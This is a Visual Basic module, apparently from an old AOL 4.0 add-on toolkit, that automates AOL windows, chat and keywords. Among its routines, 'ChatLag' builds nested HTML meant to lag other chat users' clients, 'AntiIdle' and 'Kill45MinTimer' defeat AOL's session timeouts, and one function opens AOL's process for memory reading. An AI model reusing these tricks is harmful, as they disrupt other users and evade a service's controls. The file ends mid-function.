Declare Function mciGetErrorString Lib "winmm.dll" Alias "mciGetErrorStringA" (ByVal dwError As Long, ByVal lpstrBuffer As String, ByVal uLength As Long) As Long
Declare Function GetFreeSystemResources Lib "user32" (ByVal fuSysResource As Integer) As Integer
Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, lpvParam As Any, ByVal fuWinIni As Long) As Long

Declare Function GetWindowDC Lib "User" (ByVal hwnd As Integer) As Integer
Declare Function SwapMouseButton% Lib "User" (ByVal bSwap%)
Declare Function ENumChildWindow% Lib "User" (ByVal hWndParent%, ByVal lpEnumFunc&, ByVal lParam&)
Declare Function FillRect Lib "User" (ByVal hdc As Integer, lpRect As RECT, ByVal hBrush As Integer) As Integer

Declare Sub Rectangle Lib "GDI" (ByVal hdc As Integer, ByVal X1 As Integer, ByVal Y1 As Integer, ByVal X2 As Integer, ByVal Y2 As Integer)
Declare Function CreateSolidBrush Lib "GDI" (ByVal crColor As Long) As Integer
Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, ByVal cmd As Long) As Long
Declare Function IsWindowEnabled Lib "user32" (ByVal hwnd As Long) As Long
Declare Sub RtlMoveMemory Lib "kernel32" (hpvDest As Any, ByVal hpvSource&, ByVal cbCopy&)
Declare Function RedrawWindow Lib "user32" (ByVal hwnd As Long, lprcUpdate As RECT, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Declare Function MoveWindow Lib "user32" (ByVal hwnd As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Declare Function dwGetStringFromLPSTR Lib "dwspy32.dll" (ByVal lpcopy As Long) As String
Declare Sub dwCopyDataBynum Lib "dwspy32.dll" Alias "dwCopyData" (ByVal source&, ByVal dest&, ByVal nCount&)
Declare Function dwGetAddressForObject& Lib "dwspy32.dll" (object As Any)
Declare Sub dwCopyDataByString Lib "dwspy32.dll" Alias "dwCopyData" (ByVal source As String, ByVal dest As Long, ByVal nCount&)
Declare Function dwXCopyDataBynumFrom& Lib "dwspy32.dll" Alias "dwXCopyDataFrom" (ByVal mybuf As Long, ByVal foreignbuf As Long, ByVal size As Integer, ByVal foreignPID As Long)
Declare Function dwGetWndInstance& Lib "dwspy32.dll" (ByVal hwnd&)
Declare Function RegisterWindowMessage& Lib "user32" Alias "RegisterWindowMessageA" (ByVal lpString As String)
Declare Function GetWindowLong& Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long)
Declare Function EnumWindows& Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long)
Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hwnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
Declare Function CreatePopupMenu Lib "user32" () As Long
Declare Function SelectObject Lib "GDI" (ByVal hdc As Integer, ByVal hObject As Integer) As Integer
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function GetTopWindow Lib "user32" (ByVal hwnd As Long) As Long
Declare Function SetFocusAPI Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Declare Function InsertMenu Lib "user32" Alias "InsertMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DestroyMenu Lib "user32" (ByVal hMenu%) As Integer
Public Declare Function UpdateWindow& Lib "user32" (ByVal hwnd As Long)
Declare Function GetSystemMetrics Lib "user32" (ByVal nIndex As Long) As Long
Public Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
Public Declare Function GetWindowWord Lib "user32" (ByVal hwnd As Long, ByVal nIndex As Long) As Integer
Declare Function GetSystemMenu Lib "user32" (ByVal hwnd As Integer, ByVal bRevert As Integer) As Integer
Declare Function CreateEllipticRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function SetWindowRgn Lib "user32" (ByVal hwnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long
Declare Function CreateRectRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function GetClientRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long

Declare Function CombineRgn Lib "gdi32" (ByVal hDestRgn As Long, ByVal hSrcRgn1 As Long, ByVal hSrcRgn2 As Long, ByVal nCombineMode As Long) As Long

Declare Function CreateRoundRectRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long, ByVal X3 As Long, ByVal Y3 As Long) As Long

Private Declare Function RegOpenKeyEx Lib "advapi32" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal dwReserved As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName$, ByVal lpdwReserved As Long, lpdwType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32" (ByVal hKey As Long) As Long
Public Declare Function IsWindow& Lib "user32" (ByVal hwnd As Long)
Declare Function IsZoomed Lib "user32" (ByVal hwnd As Long) As Long
Declare Function IsMenu Lib "user32" (ByVal hMenu As Long) As Long
Declare Function IsIconic Lib "user32" (ByVal hwnd As Long) As Long
Declare Function EnableMenuItem Lib "user32" (ByVal hMenu As Long, ByVal wIDEnableItem As Long, ByVal wEnable As Long) As Long
Declare Function CheckMenuItem Lib "user32" (ByVal hMenu As Long, ByVal wIDCheckItem As Long, ByVal wCheck As Long) As Long
Declare Function ModifyMenu Lib "user32" Alias "ModifyMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpString As String) As Long
Type COLORRGB
  red As Long
  green As Long
  blue As Long
End Type
Sub AOLtoTop()
Call BringWindowToTop(GetParent(MDI))
End Sub
Function RegGetString$(hInKey As Long, ByVal subkey$, ByVal valname$)
Dim retval$, hSubKey As Long, dwType As Long, SZ As Long
Dim R As Long
Dim v$
retval$ = ""
Const KEY_ALL_ACCESS As Long = &HF0063
Const ERROR_SUCCESS As Long = 0
Const REG_SZ As Long = 1
R = RegOpenKeyEx(hInKey, subkey$, 0, KEY_ALL_ACCESS, hSubKey)
If R <> ERROR_SUCCESS Then GoTo Quit_Now
SZ = 256: v$ = String$(SZ, 0)
R = RegQueryValueEx(hSubKey, valname$, 0, dwType, ByVal v$, SZ)
If R = ERROR_SUCCESS And dwType = REG_SZ Then
retval$ = Left$(v$, SZ)
Else
retval$ = Left$(v$, SZ)
End If
If hInKey = 0 Then R = RegCloseKey(hSubKey)
Quit_Now:
RegGetString$ = retval$
End Function
Function GetCurrPrinter() As String
'Gets current Printer Driver name from the System Registry
GetCurrPrinter = RegGetString$(HKEY_CURRENT_CONFIG, "System\CurrentControlSet\Control\Print\Printers", "Default")
End Function
Function GetBit() As String
'Gets current Windows Bit(ie 16,24,32) name from the System Registry
GetBit = RegGetString$(HKEY_CURRENT_CONFIG, "Display\Settings", "BitsPerPixel")
End Function
Function GetWVer() As String
'Gets current Windows Version along with the Sub Version name from the System Registry
GetWVer = RegGetString$(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion", "VersionNumber")
End Function
Function GetWSubVer() As String
GetWSubVer = RegGetString$(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion", "SubVersionNumber")
End Function
Function GetWUsernm() As String
'Gets current Windows User's Name from the System Registry
GetWUsernm = RegGetString$(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner")
End Function
Function GetWVer2() As String
'Gets current Windows Version (ie 95,98) name from the System Registry
GetWVer2 = RegGetString$(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion", "ProductName")
End Function
Sub RunMenuByString2(StringSearch)
Dim SubCount%, FindString, MenuCount%, ToSearchSub%, getstring%, RunTheMenu%, menuItemCount% 'runthemenu returns a 0 and locks up
hwnd% = FindWindow("AOL Frame25", vbNullString)
hMenu% = GetMenu(hwnd)
MenuCount% = GetMenuItemCount(hMenu%)
For FindString = 0 To MenuCount% - 1
ToSearchSub% = GetSubMenu(hMenu%, FindString)
menuItemCount% = GetMenuItemCount(ToSearchSub%)
For getstring = 0 To menuItemCount% - 1
SubCount% = GetMenuItemID(ToSearchSub%, getstring)
MenuString$ = String$(100, " ")
GetStringMenu% = GetMenuString(ToSearchSub%, SubCount%, MenuString$, 100, 1)
If InStr(UCase(MenuString$), UCase(StringSearch)) Then
MenuItem% = SubCount%
GoTo MatchString
End If
Next getstring
Next FindString
MatchString:
RunTheMenu% = SendMessage(hwnd, WM_COMMAND, MenuItem%, 0)
End Sub
Public Function FindChildByTitle2(ParenthWnd, childhand$)
Dim Copy
Copy = ParenthWnd
GetCaption (ParenthWnd)
Caption$ = Left$(Caption$, Len(childhand$))
If Caption$ = childhand$ Then GoTo foundit
Do While ParenthWnd <> 0 And Caption$ <> childhand$
ParenthWnd = GetWindow(ParenthWnd, 2)
GetCaption (ParenthWnd)
Caption$ = Left$(Caption$, Len(childhand$))
Loop
foundit:
FindChildByTitle2 = ParenthWnd
ParenthWnd = Copy
End Function
Function FindChildByClass2(ParenthWnd, childhand)
Dim returnstring$, handles%, Parent, Copy
Copy = ParenthWnd
Parent = GetWindow(ParenthWnd, 5)
Top:
returnstring$ = String$(250, 0): handles% = GetClassName(Parent, returnstring$, 250)
If Left$(returnstring$, Len(childhand)) Like childhand Then GoTo ending:
Parent = GetWindow(Parent, 2)
If Parent > 0 Then GoTo Top
ending:
FindChildByClass2 = Parent
ParenthWnd = Copy
End Function
Sub StayOnTop(the As Form)
Dim SetWinOnTop%
SetWinOnTop = SetWindowPos(the.hwnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)
End Sub
Public Function GetChildCount(ByVal hwnd As Long) As Long
'This gets the number of open childs
Dim hChild As Long
Dim I As Integer
If hwnd = 0 Then
GoTo Return_False
End If
hChild = GetWindow(hwnd, GW_CHILD)
While hChild
hChild = GetWindow(hChild, GW_HWNDNEXT)
I = I + 1
Wend
GetChildCount = I
Exit Function
Return_False:
GetChildCount = 0
Exit Function
End Function
Function GetClassCount(hWind, Class_To_Search)
cnt = 0
If FindChildByClass(hWind, Class_To_Search) = 0 Then Exit Function
Do
    DoEvents
    wind = FindWindowEx(hWind, wind, Class_To_Search, vbNullString)
    If wind <> 0 Then
        cnt = cnt + 1
    Else
        Exit Do
    End If
Loop
GetClassCount = cnt
End Function
Function GetChatHandles()
Dim e2%, class%
chatroomname$ = ""
RoomHandle% = 0
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass2(AOL%, "MDIClient")
child% = FindChildByClass2(MDI%, "AOL Child")
e2 = 1
getnextwindow:
If e2 = 0 Then child% = GetWindow(child%, 2)
If child% = 0 Then GoTo ending
e2 = FindChildByClass2(child%, "_AOL_Listbox")
AOLList% = e2
If e2 = 0 Then GoTo getnextwindow
e2 = FindChildByClass2(child%, "_AOL_Combobox")
If e2 = 0 Then GoTo getnextwindow
e2 = FindChildByClass2(child%, "RICHCNTL")
If e2 = 0 Then GoTo getnextwindow
RoomHandle% = child%
chatroomname$ = GetCaption(RoomHandle%)
texthandle% = e2
chatbox% = texthandle%
For X = 1 To 6: texthandle% = GetWindow(texthandle%, 2): Next X
SendButton% = FindChildByClass2(RoomHandle%, "_AOL_Icon")
For X = 1 To 5: SendButton% = GetWindow(SendButton%, 2): Next
ending:
End Function
Public Function GetCaption2(hwwnd) As String
Dim A%, hwndlength%
hwndlength% = GetWindowTextLength(hwwnd)
Caption$ = String$(hwndlength%, 0)
A% = GetWindowText(hwwnd, Caption$, (hwndlength% + 1))
GetCaption2 = Caption$
End Function
Private Function GetAOLProcessHandle(ByVal hwnd As Long) As Long
On Error Resume Next
Dim m_AOLThreadId As Long
Dim m_AOLProcessID As Long
m_AOLThreadId = GetWindowThreadProcessId(hwnd, m_AOLProcessID)
GetAOLProcessHandle = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, m_AOLProcessID)
End Function
Function FindAOLDir()
If FileExists("C:\AOL40\") <> 0 Then FindAOLDir = "C:\AOL40\"
If FileExists("C:\aol40a\") <> 0 Then FindAOLDir = "C:\AOL40A\"
If FileExists("C:\aol40b\") <> 0 Then FindAOLDir = "C:\AOL40B\"
If FileExists("C:\aol4\") <> 0 Then FindAOLDir = "C:\AOL4\"
If FileExists("C:\AMERICA ONLINE 4.0\") <> 0 Then FindAOLDir = "C:\AMERICA ONLINE 4.0\"
If FileExists("C:\aol\") <> 0 Then FindAOLDir = "C:\AOL\"
If FileExists("D:\AOL40\") <> 0 Then FindAOLDir = "D:\AOL40\"
If FileExists("D:\aol40a\") <> 0 Then FindAOLDir = "D:\AOL40A\"
If FileExists("D:\aol40b\") <> 0 Then FindAOLDir = "D:\AOL40B\"
If FileExists("D:\aol4\") <> 0 Then FindAOLDir = "D:\AOL4\"
If FileExists("D:\AMERICA ONLINE 4.0\") <> 0 Then FindAOLDir = "D:\AMERICA ONLINE 4.0\"
If FileExists("D:\aol\") <> 0 Then FindAOLDir = "D:\AOL\"
FindAOLDir = FindAOLDir
End Function
Public Sub SendTextToHandle(Handle%, lParam$)
X = SendMessageByString(Handle%, 12, 0, lParam$)
End Sub
Public Function GetTextFromHandle(hwnd%)
Dim GetTrim&, TrimSpace$
GetTrim = SendMessageByNum(hwnd%, 14, 0&, 0&)
TrimSpace = Space$(GetTrim)
getstring = SendMessageByString(hwnd%, 13, GetTrim + 1, TrimSpace)
GetTextFromHandle = TrimSpace$
End Function
Function FindChildByClass(parentw, childhand)
Firs% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(Firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Bong
Firs% = GetWindow(parentw, GW_CHILD)
If UCase(Mid(GetClass(Firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Bong
While Firs%
Firss% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(Firss%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Bong
Firs% = GetWindow(Firs%, 2)
If UCase(Mid(GetClass(Firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Bong
Wend
FindChildByClass = 0
Bong:
Room% = Firs%
FindChildByClass = Room%
End Function
Function FindChildByTitle(parentw, childhand)
Firs% = GetWindow(parentw, 5)
If UCase(GetCaption(Firs%)) Like UCase(childhand) Then GoTo Bong
Firs% = GetWindow(parentw, GW_CHILD)
While Firs%
Firss% = GetWindow(parentw, 5)
If UCase(GetCaption(Firss%)) Like UCase(childhand) & "*" Then GoTo Bong
Firs% = GetWindow(Firs%, 2)
If UCase(GetCaption(Firs%)) Like UCase(childhand) & "*" Then GoTo Bong
Wend
FindChildByTitle = 0
Bong:
Room% = Firs%
FindChildByTitle = Room%
End Function
Sub HideWindow(hwnd)
hi = ShowWindow(hwnd, SW_HIDE)
End Sub
Sub AcidTrip(frm As Form)
Dim cx, cy, Radius, Limit
    frm.ScaleMode = 3
    cx = frm.ScaleWidth / 2
    cy = frm.ScaleHeight / 2
    If cx > cy Then Limit = cy Else Limit = cx
    For Radius = 0 To Limit
frm.Circle (cx, cy), Radius, RGB(Rnd * 255, Rnd * 255, Rnd * 255)
    Next Radius
End Sub
Sub SendCharNum(win, chars)
e = SendMessageByNum(win, WM_CHAR, chars, 0)
End Sub
Sub Enter(win)
Call SendCharNum(win, 13)
End Sub
Function GetClass(child)
buffer$ = String$(250, 0)
Getclas% = GetClassName(child, buffer$, 250)
GetClass = buffer$
End Function
Function GetTextLineCount(Text)
If Text = "" Then
GetTextLineCount = "0"
Else
theview$ = Text
For FindChar = 1 To Len(theview$)
thechar$ = Mid(theview$, FindChar, 1)
If thechar$ = Chr(13) Then
numline = numline + 1
End If
Next FindChar
If Mid(Text, Len(Text), 1) = Chr(13) Then
GetTextLineCount = numline
Else
GetTextLineCount = numline + 1
End If
End If
End Function
Function AOL40_FindChatRoom()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Room% = FindChildByClass(MDI%, "AOL Child")
Stuff% = FindChildByClass(Room%, "_AOL_Listbox")
MoreStuff% = FindChildByClass(Room%, "RICHCNTL")
If Stuff% <> 0 And MoreStuff% <> 0 Then
   AOL40_FindChatRoom = Room%
Else:
   AOL40_FindChatRoom = 0
End If
End Function
Sub Enable(hwnd)
Dim Ret As Long
Ret = EnableWindow(hwnd, 1)
End Sub
Sub Disable(hwnd)
Ret = EnableWindow(hwnd, 0)
End Sub
Function RandomNumber(finished As Integer)
Randomize
RandomNumber = Int((val(finished) * Rnd) + 1)
End Function
Function ChatLag(thetext As String)
G$ = thetext$
A = Len(G$)
For w = 1 To A Step 3
    R$ = Mid$(G$, w, 1)
    u$ = Mid$(G$, w + 1, 1)
    s$ = Mid$(G$, w + 2, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#000000" & Chr$(34) & "><pre><html><pre><html><pre><html>" & R$ & "</html></pre></html></pre></html></pre>" & "<FONT COLOR=" & Chr$(34) & "#000000" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#000000" & Chr$(34) & "><pre><html>" & s$ & "</html></pre>"
Next w
ChatLag = p$
End Function
Function StringInList(thelist As ListBox, FindMe As String)
If thelist.ListCount = 0 Then GoTo Nope
For A = 0 To thelist.ListCount - 1
thelist.ListIndex = A
If UCase(thelist.Text) = UCase(FindMe) Then
StringInList = A
Exit Function
End If
Next A
Nope:
StringInList = -1
End Function
Function AOL40_IsOnline() As Boolean
If GetUser <> "" Then
   AOL40_IsOnline = True
Else
   AOL40_IsOnline = False
End If
End Function
Function GetCaption(hwnd)
hwndlength% = GetWindowTextLength(hwnd)
hwndTitle$ = String$(hwndlength%, 0)
A% = GetWindowText(hwnd, hwndTitle$, (hwndlength% + 1))
GetCaption = hwndTitle$
End Function
Sub AOL40_SendChat(chat)
Room% = AOL40_FindChatRoom
AORich% = FindChildByClass(Room%, "RICHCNTL")
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub
Sub timeout(Duration)
StartTime = Timer
Do While Timer - StartTime < Duration
DoEvents
Loop
End Sub
Sub Anti45MinTimer()
AOTimer% = FindWindow("_AOL_Palette", vbNullString)
AOIcon% = FindChildByClass(AOTimer%, "_AOL_Icon")
ClickIcon (AOIcon%)
End Sub
Sub AntiIdle()
AOModal% = FindWindow("_AOL_Modal", vbNullString)
AOIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (AOIcon%)
End Sub
Sub Kill45MinTimer()
imer% = FindWindow("_AOL_Palette", "America Online Timer")
Ico% = FindChildByClass(imer%, "_AOL_Icon")
Do
DoEvents
ClickIcon Ico%
Loop Until IsWindow(Ico%) = 0
End Sub
Public Sub HideWelcome()
X = FindChildByTitle(AOLMDI(), "Welcome, " & GetUser & "!")
Call ShowWindow(X, SW_HIDE)
End Sub
Sub TextSound(wav$, Text$)
Call ChatSend(Text$ & " <font color=#fffffe> " & wav$)
End Sub
Function Range(Lower As Integer, Upper As Integer) As Integer
Randomize
Range% = Int((Upper% - Lower% + 1) * Rnd + Lower%)
End Function
Sub Window_Minimize(win)
X = ShowWindow(win, SW_MINIMIZE)
End Sub
Sub Window_Maximize(win)
X = ShowWindow(win, SW_MAXIMIZE)
End Sub
Sub Window_Show(hwnd)
X = ShowWindow(hwnd, SW_SHOW)
End Sub
Sub Window_Restore(win)
X = ShowWindow(win, SW_RESTORE)
End Sub
Sub Window_Hide(hwnd)
X = ShowWindow(hwnd, SW_HIDE)
End Sub
Sub WAVStop()
Call WAVPlay(" ")
End Sub
Sub WAVLoop(file)
SoundName$ = file
wFlags% = SND_ASYNC Or SND_LOOP
X = sndPlaySound(SoundName$, wFlags%)
End Sub
Sub WAVPlay(file)
SoundName$ = file
wFlags% = SND_ASYNC Or SND_NODEFAULT
X = sndPlaySound(SoundName$, wFlags%)
End Sub
Public Sub ShowWelcome()
X = FindChildByTitle(AOLMDI(), "Welcome, " & GetUser & "!")
Call ShowWindow(X, SW_SHOW)
End Sub
Sub AOLSetText(win, Txt)
thetext% = SendMessageByString(win, WM_SETTEXT, 0, Txt)
End Sub
Function RoomCount1()
Dim chat%
chat% = AOL40_FindChatRoom()
List% = FindChildByClass(chat%, "_AOL_Listbox")
count% = SendMessage(List%, LB_GETCOUNT, 0, 0)
RoomCount1 = count%
If RoomCount1 = "1" Then
RoomCount1 = "one"
End If
If RoomCount1 = "2" Then
RoomCount1 = "two"
End If
If RoomCount1 = "3" Then
RoomCount1 = "three"
End If
If RoomCount1 = "4" Then
RoomCount1 = "four"
End If
If RoomCount1 = "5" Then
RoomCount1 = "five"
End If
If RoomCount1 = "6" Then
RoomCount1 = "six"
End If
If RoomCount1 = "7" Then
RoomCount1 = "seven"
End If
If RoomCount1 = "8" Then
RoomCount1 = "eight"
End If
If RoomCount1 = "9" Then
RoomCount1 = "nine"
End If
If RoomCount1 = "10" Then
RoomCount1 = "ten"
End If
If RoomCount1 = "11" Then
RoomCount1 = "eleven"
End If
If RoomCount1 = "12" Then
RoomCount1 = "twelve"
End If
If RoomCount1 = "13" Then
RoomCount1 = "thirteen"
End If
If RoomCount1 = "14" Then
RoomCount1 = "fourteen"
End If
If RoomCount1 = "15" Then
RoomCount1 = "fifteen"
End If
If RoomCount1 = "16" Then
RoomCount1 = "sixteen"
End If
If RoomCount1 = "17" Then
RoomCount1 = "seventeen"
End If
If RoomCount1 = "18" Then
RoomCount1 = "eighteen"
End If
If RoomCount1 = "19" Then
RoomCount1 = "nineteen"
End If
If RoomCount1 = "20" Then
RoomCount1 = "twenty"
End If
If RoomCount1 = "21" Then
RoomCount1 = "twenty-one"
End If
If RoomCount1 = "22" Then
RoomCount1 = "twenty-two"
End If
If RoomCount1 = "23" Then
RoomCount1 = "twenty-three"
End If
If RoomCount1 = "24" Then
RoomCount1 = "twenty-four"
End If
If RoomCount1 = "25" Then
RoomCount1 = "twenty-five"
End If
If RoomCount1 = "26" Then
RoomCount1 = "twenty-six"
End If
End Function
Function AOLMDI()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOLMDI = FindChildByClass(AOL%, "MDIClient")
End Function
Function FreeProcess()
Do: DoEvents
Process = Process + 1
If Process = 50 Then Exit Do
Loop
End Function
Sub AOL40_Keyword(TheKeyWord As String)
AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
aotool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
AOIcon% = FindChildByClass(aotool2%, "_AOL_Icon")
For GetIcon = 1 To 20
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon
Call timeout(0.05)
ClickIcon (AOIcon%)
Do: DoEvents
MDI% = FindChildByClass(AOL%, "MDIClient")
KeyWordWin% = FindChildByTitle(MDI%, "Keyword")
AOEdit% = FindChildByClass(KeyWordWin%, "_AOL_Edit")
AOIcon2% = FindChildByClass(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And AOEdit% <> 0 And AOIcon2% <> 0
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, TheKeyWord)
Call timeout(0.05)
ClickIcon (AOIcon2%)
ClickIcon (AOIcon2%)
End Sub
Function WinCaption(win)
Dim GetWinText%
WinTextLength% = GetWindowTextLength(win)
WinTitle$ = String$(hwndlength%, 0)
GetWinText% = GetWindowText(win, WinTitle$, (WinTextLength% + 1))
WinCaption = WinTitle$
End Function
Function Window_Close(win)
Dim X%
X% = SendMessage(win, WM_CLOSE, 0, 0)
End Function
Function GetText(child)
GetTrim = SendMessageByNum(child, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
getstring = SendMessageByString(child, 13, GetTrim + 1, TrimSpace$)
GetText = TrimSpace$
End Function
Function AOL40_GetChatText()
Room% = AOL40_FindChatRoom
AORich% = FindChildByClass(Room%, "RICHCNTL")
ChatText$ = GetText(AORich%)
AOL40_GetChatText = ChatText$
End Function
Function clearchat()
Dim dat%
Call GetChatHandles
RoomHandle = FindChildByClass(RoomHandle, "RICHCNTL")
Call SendTextToHandle(RoomHandle, "")
End Function
Function LastChatLineWithSN()
again:
ChatText$ = AOL40_GetChatText
If AOL40_GetChatText = "" Then GoTo again:
For FindChar = 1 To Len(ChatText$)
thechar$ = Mid(ChatText$, FindChar, 1)
thechars$ = thechars$ & thechar$
If thechar$ = Chr(13) Then
thechattext$ = Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
End If
Next FindChar
lastlen = val(FindChar) - Len(thechars$)
lastline = Mid(ChatText$, lastlen, Len(thechars$))
LastChatLineWithSN = lastline
End Function
Function SecondToLastChatLineWithSN()
ChatText$ = AOL40_GetChatText
For FindChar = 1 To Len(ChatText$)
thechar$ = Mid(ChatText$, FindChar, 1)
thechars$ = thechars$ & thechar$
If thechar$ = Chr(13) Then
thechattext$ = Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
End If
Next FindChar
SecondToLastChatLineWithSN = thechattext$
End Function
Function ChatToList(Lst As ListBox)
again:
ChatText$ = AOL40_GetChatText
If AOL40_GetChatText = "" Then GoTo again:
For FindChar = 1 To Len(ChatText$)
thechar$ = Mid(ChatText$, FindChar, 1)
thechars$ = thechars$ & thechar$
If thechar$ = Chr(13) Then
thechattext$ = Mid(thechars$, 1, Len(thechars$) - 1)
Lst.AddItem (thechattext$)
thechars$ = ""
End If
Next FindChar
lastlen = val(FindChar) - Len(thechars$)
lastline = Mid(ChatText$, lastlen, Len(thechars$))
Lst.AddItem (lastline)
End Function
Function SNFromLastChatLine()
ChatText$ = LastChatLineWithSN
chattrim$ = Left$(ChatText$, 11)
For z = 1 To 11
    If Mid$(chattrim$, z, 1) = ":" Then
        SN = Left$(chattrim$, z - 1)
    End If
Next z
SNFromLastChatLine = SN
End Function
Function LastChatLine()
On Error Resume Next
ChatText$ = LastChatLineWithSN
ChatTrimNum = Len(SNFromLastChatLine)
chattrim$ = Mid$(ChatText$, ChatTrimNum + 4, Len(ChatText$) - Len(AOL40_SNFromLastChatLine))
LastChatLine = chattrim$
End Function
Function RemoveSpace(Txt$) As String
NoSpace$ = Txt$
While InStr(NoSpace$, " ") <> 0
Where = InStr(NoSpace$, " ")
NoSpace$ = Mid(NoSpace$, 1, Where - 1) + Mid(NoSpace$, Where + 1)
Wend
RemoveSpace = NoSpace$
End Function
Function SpaceCase(Text As String) As String
Txt$ = Text$
Txt$ = Trim(UCase(RemoveSpace(Txt$)))
SpaceCase = Txt$
End Function
Function GetWindowByClass(Parent As Integer, ByVal class As String) As Integer
win% = GetWindow(GetWindow(Parent%, GW_CHILD), GW_HWNDFIRST)
Do
Text$ = GetClass(win%)
If SpaceCase(Text$) = SpaceCase(class$) Then Exit Do
If findchild = True Then
    If GetWindow(win%, GW_CHILD) Then
        ChildWin% = GetWindowByClass(win%, class$)
        If ChildWin% <> 0 Then
            win% = ChildWin%
            Exit Do
        End If
    End If
End If
win% = GetWindow(win%, GW_HWNDNEXT)
Loop Until win% = 0
GetWindowByClass = win%
End Function
Function FixAPIString(sText As String) As String
On Error Resume Next
If InStr(sText$, Chr$(0)) <> 0 Then FixAPIString = Trim(Mid$(sText$, 1, InStr(sText$, Chr$(0)) - 1))
If InStr(sText$, Chr$(0)) = 0 Then FixAPIString = Trim(sText$)
End Function
Function GetAPIText(hwnd As Integer) As String
X = SendMessageByNum(hwnd%, WM_GETTEXTLENGTH, 0, 0)
    Text$ = Space(X + 1)
    X = SendMessageByString(hwnd%, WM_GETTEXT, X + 1, Text$)
    GetAPIText = FixAPIString(Text$)
End Function
Function GetWindowByTitle(Parent As Integer, ByVal Title As String) As Integer
win% = GetWindow(GetWindow(Parent%, GW_CHILD), GW_HWNDFIRST)
